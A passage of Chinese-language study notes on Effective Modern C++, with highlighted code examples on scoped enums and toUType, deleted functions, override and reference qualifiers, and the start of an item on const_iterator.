uInfo;                 <span class="hljs-comment">//tuple对象</span><br>…<br><span class="hljs-keyword">auto</span> val = <span class="hljs-built_in">std</span>::get&lt;<span class="hljs-number">1</span>&gt;(uInfo);<span class="hljs-comment">//获取第一个字段</span><br></code></pre></div></td></tr></table></figure><p>在 get 时，显示写明1随代表的字段。</p><p>用非限域<code>enum</code>将名字和字段编号关联起来以避免上述需求：</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-keyword">enum</span> UserInfoFields &#123; uiName, uiEmail, uiReputation &#125;;<br><br>UserInfo uInfo;                         <span class="hljs-comment">//同之前一样</span><br>…<br><span class="hljs-keyword">auto</span> val = <span class="hljs-built_in">std</span>::get&lt;uiEmail&gt;(uInfo);    <span class="hljs-comment">//啊，获取用户email字段的值</span><br></code></pre></div></td></tr></table></figure><p>之所以它能正常工作是因为<code>UserInfoFields</code>中的枚举名隐式转换成<code>std::size_t</code>。</p><p>对应的限域<code>enum</code>版本就很啰嗦了：</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-keyword">enum</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">UserInfoFields</span> &#123;</span> uiName, uiEmail, uiReputation &#125;;<br><br>UserInfo uInfo;                         <span class="hljs-comment">//同之前一样</span><br>…<br><span class="hljs-keyword">auto</span> val =<br>    <span class="hljs-built_in">std</span>::get&lt;<span class="hljs-keyword">static_cast</span>&lt;<span class="hljs-built_in">std</span>::<span class="hljs-keyword">size_t</span>&gt;(UserInfoFields::uiEmail)&gt;<br>        (uInfo);<br></code></pre></div></td></tr></table></figure><p>为避免这种冗长的表示，我们可以写一个函数传入枚举名并返回对应的<code>std::size_t</code>值，但这有一点技巧性。</p><p>将枚举名变换为<code>std::size_t</code>值的函数必须<strong>在编译期</strong>产生这个结果。</p><p>它该是一个<code>constexpr</code>函数模板，因为它应该能用于任何<code>enum</code>。</p><p>底层类型可以通过<code>std::underlying_type</code>这个<em>typetrait</em>获得。</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-keyword">template</span>&lt;<span class="hljs-keyword">typename</span> E&gt;<br><span class="hljs-keyword">constexpr</span> <span class="hljs-keyword">typename</span> <span class="hljs-built_in">std</span>::underlying_type&lt;E&gt;::type<br>    toUType(E enumerator) <span class="hljs-keyword">noexcept</span><br>&#123;<br>    <span class="hljs-keyword">return</span><br>        <span class="hljs-keyword">static_cast</span>&lt;<span class="hljs-keyword">typename</span><br>                    <span class="hljs-built_in">std</span>::underlying_type&lt;E&gt;::type&gt;(enumerator);<br>&#125;<br></code></pre></div></td></tr></table></figure><p>在C++14中，<code>toUType</code>还可以进一步用<code>std::underlying_type_t</code>代替<code>typename std::underlying_type&lt;E&gt;::type</code>打磨：</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-keyword">template</span>&lt;<span class="hljs-keyword">typename</span> E&gt;                <span class="hljs-comment">//C++14</span><br><span class="hljs-keyword">constexpr</span> <span class="hljs-built_in">std</span>::<span class="hljs-keyword">underlying_type_t</span>&lt;E&gt;<br>    toUType(E enumerator) <span class="hljs-keyword">noexcept</span><br>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">static_cast</span>&lt;<span class="hljs-built_in">std</span>::<span class="hljs-keyword">underlying_type_t</span>&lt;E&gt;&gt;(enumerator);<br>&#125;<br></code></pre></div></td></tr></table></figure><p>还可以再用C++14 <code>auto</code>打磨一下代码：</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-keyword">template</span>&lt;<span class="hljs-keyword">typename</span> E&gt;                <span class="hljs-comment">//C++14</span><br><span class="hljs-keyword">constexpr</span> <span class="hljs-keyword">auto</span><br>    toUType(E enumerator) <span class="hljs-keyword">noexcept</span><br>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">static_cast</span>&lt;<span class="hljs-built_in">std</span>::<span class="hljs-keyword">underlying_type_t</span>&lt;E&gt;&gt;(enumerator);<br>&#125;<br></code></pre></div></td></tr></table></figure><p>不管它怎么写，<code>toUType</code>现在允许这样访问tuple的字段了：</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-keyword">auto</span> val = <span class="hljs-built_in">std</span>::get&lt;toUType(UserInfoFields::uiEmail)&gt;(uInfo);<br></code></pre></div></td></tr></table></figure><h3><span id="结论">结论</span></h3><ul><li>限域<code>enum</code>的枚举名仅在<code>enum</code>内可见。要转换为其它类型只能使用<em>cast</em>。</li><li>非限域/限域<code>enum</code>都支持底层类型说明语法，限域<code>enum</code>底层类型默认是<code>int</code>。非限域<code>enum</code>没有默认底层类型。</li><li>限域<code>enum</code>总是可以前置声明。非限域<code>enum</code>仅当指定它们的底层类型时才能前置。</li></ul><h2><span id="11-使用-delete而不是私有化其声明">11 使用 delete而不是私有化其声明</span></h2><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-keyword">template</span> &lt;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">charT</span>, <span class="hljs-title">class</span> <span class="hljs-title">traits</span> = <span class="hljs-title">char_traits</span>&lt;charT&gt; &gt;</span><br><span class="hljs-class"><span class="hljs-title">class</span> <span class="hljs-title">basic_ios</span> :</span> <span class="hljs-keyword">public</span> ios_base &#123;<br><span class="hljs-keyword">public</span>:<br>    …<br><br>    basic_ios(<span class="hljs-keyword">const</span> basic_ios&amp; ) = <span class="hljs-keyword">delete</span>;<br>    basic_ios&amp; <span class="hljs-keyword">operator</span>=(<span class="hljs-keyword">const</span> basic_ios&amp;) = <span class="hljs-keyword">delete</span>;<br>    …<br>&#125;;<br></code></pre></div></td></tr></table></figure><p><em>deleted</em>函数不能以任何方式被调用，即使你在成员函数或者友元函数里面调用<em>deleted</em>函数也<strong>不能通过编译</strong>。这是较之C++98行为的一个改进，C++98中不正确的使用这些函数在链接时才被诊断出来。</p><p>通常，<em>deleted</em>函数被声明为<code>public</code>而不是<code>private</code>。这也是有原因的。当客户端代码试图调用成员函数，C++会在检查<em>deleted</em>状态前检查它的访问性。当客户端代码调用一个私有的<em>deleted</em>函数，一些编译器只会给出该函数是<code>private</code>的错误。</p><p><em>deleted</em>函数还有一个重要的优势是<strong>任何</strong>函数都可以标记为<em>deleted</em>，而只有成员函数可被标记为<code>private</code>。</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-keyword">bool</span> <span class="hljs-title">isLucky</span><span class="hljs-params">(<span class="hljs-keyword">int</span> number)</span></span>;       <span class="hljs-comment">//原始版本</span><br><span class="hljs-function"><span class="hljs-keyword">bool</span> <span class="hljs-title">isLucky</span><span class="hljs-params">(<span class="hljs-keyword">char</span>)</span> </span>= <span class="hljs-keyword">delete</span>;    <span class="hljs-comment">//拒绝char</span><br><span class="hljs-function"><span class="hljs-keyword">bool</span> <span class="hljs-title">isLucky</span><span class="hljs-params">(<span class="hljs-keyword">bool</span>)</span> </span>= <span class="hljs-keyword">delete</span>;    <span class="hljs-comment">//拒绝bool</span><br><span class="hljs-function"><span class="hljs-keyword">bool</span> <span class="hljs-title">isLucky</span><span class="hljs-params">(<span class="hljs-keyword">double</span>)</span> </span>= <span class="hljs-keyword">delete</span>;  <span class="hljs-comment">//拒绝float和double</span><br></code></pre></div></td></tr></table></figure><p>另一个<em>deleted</em>函数用武之地（<code>private</code>成员函数做不到的地方）是禁止一些模板的实例化。假如你要求一个模板仅支持原生指针:</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-keyword">template</span>&lt;<span class="hljs-keyword">typename</span> T&gt;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">processPointer</span><span class="hljs-params">(T* ptr)</span></span>;<br><br><span class="hljs-keyword">template</span>&lt;&gt;<br><span class="hljs-keyword">void</span> processPointer&lt;<span class="hljs-keyword">void</span>&gt;(<span class="hljs-keyword">void</span>*) = <span class="hljs-keyword">delete</span>;<br><br><span class="hljs-keyword">template</span>&lt;&gt;<br><span class="hljs-keyword">void</span> processPointer&lt;<span class="hljs-keyword">char</span>&gt;(<span class="hljs-keyword">char</span>*) = <span class="hljs-keyword">delete</span>;<br><br><span class="hljs-keyword">template</span>&lt;&gt;<br><span class="hljs-keyword">void</span> processPointer&lt;<span class="hljs-keyword">const</span> <span class="hljs-keyword">void</span>&gt;(<span class="hljs-keyword">const</span> <span class="hljs-keyword">void</span>*) = <span class="hljs-keyword">delete</span>;<br><br><span class="hljs-keyword">template</span>&lt;&gt;<br><span class="hljs-keyword">void</span> processPointer&lt;<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span>&gt;(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span>*) = <span class="hljs-keyword">delete</span>;<br></code></pre></div></td></tr></table></figure><p>如果你想做得更彻底一些，你还要删除<code>const volatile void*</code>和<code>const volatile char*</code>重载版本，另外还需要一并删除其他标准字符类型的重载版本：<code>std::wchar_t</code>，<code>std::char16_t</code>和<code>std::char32_t</code>。</p><p>类模板在命名空间作用域中，删除特定实例化（private 是做不到的）：</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Widget</span> &#123;</span><br><span class="hljs-keyword">public</span>:<br>    …<br>    <span class="hljs-keyword">template</span>&lt;<span class="hljs-keyword">typename</span> T&gt;<br>    <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">processPointer</span><span class="hljs-params">(T* ptr)</span></span><br><span class="hljs-function">    </span>&#123; … &#125;<br>    …<br><br>&#125;;<br><br><span class="hljs-keyword">template</span>&lt;&gt;                                          <span class="hljs-comment">//还是public，</span><br><span class="hljs-keyword">void</span> Widget::processPointer&lt;<span class="hljs-keyword">void</span>&gt;(<span class="hljs-keyword">void</span>*) = <span class="hljs-keyword">delete</span>;  <span class="hljs-comment">//但是已经被删除了</span><br></code></pre></div></td></tr></table></figure><h3><span id="结论">结论</span></h3><ul><li>使用<em>delete</em>函数更好</li><li>任何函数都能 delete，包括非成员函数和模板实例</li></ul><h2><span id="12使用override声明重写函数">12使用<code>override</code>声明重写函数</span></h2><p>派生类的虚函数<strong>重写</strong>基类同名函数，很可能一不小心就错了。</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Base</span> &#123;</span><br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">void</span> <span class="hljs-title">doWork</span><span class="hljs-params">()</span></span>;          <span class="hljs-comment">//基类虚函数</span><br>    …<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Derived</span>:</span> <span class="hljs-keyword">public</span> Base &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">void</span> <span class="hljs-title">doWork</span><span class="hljs-params">()</span></span>;          <span class="hljs-comment">//重写Base::doWork</span><br>    …                               <span class="hljs-comment">//（这里“virtual”是可以省略的）</span><br>&#125;; <br><br><span class="hljs-built_in">std</span>::<span class="hljs-built_in">unique_ptr</span>&lt;Base&gt; upb =         <span class="hljs-comment">//创建基类指针指向派生类对象</span><br>    <span class="hljs-built_in">std</span>::make_unique&lt;Derived&gt;();    <span class="hljs-comment">//关于std::make_unique</span><br>…                                   <span class="hljs-comment">//请参见Item21</span><br><br>    <br>upb-&gt;doWork();                      <span class="hljs-comment">//通过基类指针调用doWork，</span><br>                                    <span class="hljs-comment">//实际上是派生类的doWork</span><br>                                    <span class="hljs-comment">//函数被调用</span><br></code></pre></div></td></tr></table></figure><p>要想重写一个函数，必须满足下列要求：</p><ul><li>基类函数必须是<code>virtual</code></li><li>基类和派生类函数名必须完全一样（除非是析构函数)</li><li>基类和派生类函数形参类型必须完全一样</li><li>基类和派生类函数常量性<code>const</code>ness必须完全一样</li><li>基类和派生类函数的返回值和异常说明（<em>exceptionspecifications</em>）必须兼容</li></ul><p>除了这些C++98就存在的约束外，C++11又添加了一个：</p><ul><li>函数的引用限定符（<em>referencequalifiers</em>）必须完全一样。它可以限定成员函数只能用于左值或者右值：</li></ul><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Widget</span> &#123;</span><br><span class="hljs-keyword">public</span>:<br>    …<br>    <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">doWork</span><span class="hljs-params">()</span> &amp;</span>;    <span class="hljs-comment">//只有*this为左值的时候才能被调用</span><br>    <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">doWork</span><span class="hljs-params">()</span> &amp;&amp;</span>;   <span class="hljs-comment">//只有*this为右值的时候才能被调用</span><br>&#125;; <br>…<br><span class="hljs-function">Widget <span class="hljs-title">makeWidget</span><span class="hljs-params">()</span></span>;    <span class="hljs-comment">//工厂函数（返回右值）</span><br>Widget w;               <span class="hljs-comment">//普通对象（左值）</span><br>…<br>w.doWork();             <span class="hljs-comment">//调用被左值引用限定修饰的Widget::doWork版本</span><br>                        <span class="hljs-comment">//（即Widget::doWork &amp;）</span><br>makeWidget().doWork();  <span class="hljs-comment">//调用被右值引用限定修饰的Widget::doWork版本</span><br>                        <span class="hljs-comment">//（即Widget::doWork &amp;&amp;）</span><br></code></pre></div></td></tr></table></figure><p>对于下面的例子：</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Base</span> &#123;</span><br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">void</span> <span class="hljs-title">mf1</span><span class="hljs-params">()</span> <span class="hljs-keyword">const</span></span>;<br>    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">void</span> <span class="hljs-title">mf2</span><span class="hljs-params">(<span class="hljs-keyword">int</span> x)</span></span>;<br>    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">void</span> <span class="hljs-title">mf3</span><span class="hljs-params">()</span> &amp;</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">mf4</span><span class="hljs-params">()</span> <span class="hljs-keyword">const</span></span>;<br>&#125;;<br></code></pre></div></td></tr></table></figure><p>C++11提供一个方法让你可以显式地指定一个派生类函数是基类版本的重写：将它声明为<code>override</code>。还是上面那个例子，我们可以这样做：</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Derived</span>:</span> <span class="hljs-keyword">public</span> Base &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">void</span> <span class="hljs-title">mf1</span><span class="hljs-params">()</span> <span class="hljs-keyword">override</span></span>;<br>    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">void</span> <span class="hljs-title">mf2</span><span class="hljs-params">(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> x)</span> <span class="hljs-keyword">override</span></span>;<br>    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">void</span> <span class="hljs-title">mf3</span><span class="hljs-params">()</span> &amp;&amp; <span class="hljs-keyword">override</span></span>;<br>    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">void</span> <span class="hljs-title">mf4</span><span class="hljs-params">()</span> <span class="hljs-keyword">const</span> <span class="hljs-keyword">override</span></span>;<br>&#125;;<br></code></pre></div></td></tr></table></figure><p>代码不能编译，当然了，因为这样写的时候，编译器会显示所有与重写有关的问题。这也是你想要的，以及为什么要在所有重写函数后面加上<code>override</code>。</p><p>没有<code>override</code>，你只能寄希望于完善的单元测试。</p><p>C++11引入了两个上下文关键字（<em>contextualkeywords</em>），<code>override</code>和<code>final</code>（向虚函数添加<code>final</code>可以防止派生类重写。<code>final</code>也能用于类，这时这个类不能用作基类）。</p><h3><span id="函数引用限定符">函数引用限定符</span></h3><p>referencequalifiers。如果我们想写一个函数只接受左值实参，我们声明一个non-<code>const</code>左值引用形参：</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">doSomething</span><span class="hljs-params">(Widget&amp; w)</span></span>;    <span class="hljs-comment">//只接受左值Widget对象</span><br></code></pre></div></td></tr></table></figure><p>如果我们想写一个函数只接受右值实参，我们声明一个右值引用形参：</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">doSomething</span><span class="hljs-params">(Widget&amp;&amp; w)</span></span>;   <span class="hljs-comment">//只接受右值Widget对象</span><br></code></pre></div></td></tr></table></figure><p>成员函数的引用限定可以很容易的区分一个成员函数被哪个对象（即<code>*this</code>）调用。它和在成员函数声明尾部添加一个<code>const</code>很相似，暗示了调用这个成员函数的对象（即<code>*this</code>）是<code>const</code>的。</p><p>考虑下面一个例子：</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Widget</span> &#123;</span><br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-keyword">using</span> DataType = <span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;<span class="hljs-keyword">double</span>&gt;;  <br>    …<br>    <span class="hljs-function">DataType&amp; <span class="hljs-title">data</span><span class="hljs-params">()</span> </span>&#123; <span class="hljs-keyword">return</span> values; &#125;<br>    …<br><span class="hljs-keyword">private</span>:<br>    DataType values;<br>&#125;;<br></code></pre></div></td></tr></table></figure><p>客户端代码：</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp">Widget w;<br>…<br><span class="hljs-keyword">auto</span> vals1 = w.data();  <span class="hljs-comment">//拷贝w.values到vals1</span><br></code></pre></div></td></tr></table></figure><p><code>Widget::data</code>函数的返回值是一个左值引用（准确的说是<code>std::vector&lt;double&gt;&amp;</code>）,因为左值引用是左值，所以<code>vals1</code>是从左值初始化的。因此<code>vals1</code>由<code>w.values</code>拷贝构造而得。</p><p>现在假设我们有一个创建<code>Widget</code>s的工厂函数，</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-function">Widget <span class="hljs-title">makeWidget</span><span class="hljs-params">()</span></span>;<br></code></pre></div></td></tr></table></figure><p>我们想用<code>makeWidget</code>返回的<code>Widget</code>里的<code>std::vector</code>初始化一个变量：</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-keyword">auto</span> vals2 = makeWidget().data();   <span class="hljs-comment">//拷贝Widget里面的值到vals2</span><br></code></pre></div></td></tr></table></figure><p><code>Widget</code>是<code>makeWidget</code>返回的临时对象（即右值），所以将其中的<code>std::vector</code>进行拷贝纯属浪费。最好是移动，但是因为<code>data</code>返回左值引用，C++的规则要求编译器不得不生成一个拷贝。</p><p>指明当<code>data</code>被右值<code>Widget</code>对象调用的时候结果也应该是一个右值。现在就可以使用<strong>引用限定</strong>：</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Widget</span> &#123;</span><br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-keyword">using</span> DataType = <span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;<span class="hljs-keyword">double</span>&gt;;<br>    …<br>    <span class="hljs-function">DataType&amp; <span class="hljs-title">data</span><span class="hljs-params">()</span> &amp;              <span class="hljs-comment">//对于左值Widgets,</span></span><br><span class="hljs-function">    </span>&#123; <span class="hljs-keyword">return</span> values; &#125;              <span class="hljs-comment">//返回左值</span><br>    <br>    <span class="hljs-function">DataType <span class="hljs-title">data</span><span class="hljs-params">()</span> &amp;&amp;              <span class="hljs-comment">//对于右值Widgets,</span></span><br><span class="hljs-function">    </span>&#123; <span class="hljs-keyword">return</span> <span class="hljs-built_in">std</span>::<span class="hljs-built_in">move</span>(values); &#125;   <span class="hljs-comment">//返回右值</span><br>    …<br><br><span class="hljs-keyword">private</span>:<br>    DataType values;<br>&#125;;<br></code></pre></div></td></tr></table></figure><p><code>data</code>重载的返回类型是不同的，左值引用重载版本返回一个左值引用（即一个左值），右值引用重载返回一个临时对象（即一个右值）。这意味着现在客户端的行为和我们的期望相符了：</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-keyword">auto</span> vals1 = w.data();              <span class="hljs-comment">//调用左值重载版本的Widget::data，</span><br>                                    <span class="hljs-comment">//拷贝构造vals1</span><br><span class="hljs-keyword">auto</span> vals2 = makeWidget().data();   <span class="hljs-comment">//调用右值重载版本的Widget::data, </span><br>                                    <span class="hljs-comment">//移动构造vals2</span><br></code></pre></div></td></tr></table></figure><h3><span id="结论">结论</span></h3><ul><li>为重写函数加上<code>override</code></li><li>成员函数引用限定，区别对待左值对象和右值对象（即<code>*this</code>)</li></ul><h2><span id="13-优先考虑const_iterator-而不是-iterator">13 优先考虑<code>const_iterator</code> 而不是 <code>iterator</code></span></h2><p>STL<code>const_iterator</code>等价于指向常量的指针（pointer-to-<code>const</code>）。它们都指向不能被修改的值。标准实践是能加上<code>const</code>就加上。</p><p>只是需要注意，C++11 和 C++98 对 <code>const_iterator</code>的支持不一样。</p><p>没办法简简单单的从non-<code>const</code>容器中获取<code>const_iterator</code>。</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-keyword">typedef</span> <span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;<span class="hljs-keyword">int</span>&gt;::iterator IterT;               <span class="hljs-comment">//typedef</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;<span class="hljs-keyword">int</span>&gt;::const_iterator ConstIterT;<br><br><span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;<span class="hljs-keyword">int</span>&gt; values;<br>…<br>ConstIterT ci =<br>    <span class="hljs-built_in">std</span>::find(<span class="hljs-keyword">static_cast</span>&lt;ConstIterT&gt;(values.begin()),  <span class="hljs-comment">//cast</span><br>              <span class="hljs-keyword">static_cast</span>&lt;ConstIterT&gt;(values.end()),    <span class="hljs-comment">//cast</span><br>              <span class="hljs-number">1983</span>);<br><br>values.insert(<span class="hljs-keyword">static_cast</span>&lt;IterT&gt;(ci), <span class="hljs-number">1998</span>);    <span class="hljs-comment">//可能无法通过编译，</span><br>                                                <span class="hljs-comment">//原因见下</span><br></code></pre></div></td></tr></table></figure><p>因为向 <code>insert</code>传入<code>const_iterator</code>不能通过编译，所以我们将<code>const_iterator</code>转换为<code>iterator</code>的。</p><p>上面的代码仍然可能无法编译，因为没有一个可移植的从<code>const_iterator</code>到<code>iterator</code>的方法，即使使用<code>static_cast</code>也不行。</p><p>所有的这些都在C++11中改变了，现在<code>const_iterator</code>既容易获取又容易使用。容器的成员函数<code>cbegin</code>和<code>cend</code>产出<code>const_iterator</code>，甚至对于non-<code>const</code>容器也可用，那些之前使用<em>iterator</em>指示位置（如<code>insert</code>和<code>erase</code>）的STL成员函数也可以使用<code>const_iterator</code>了。</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 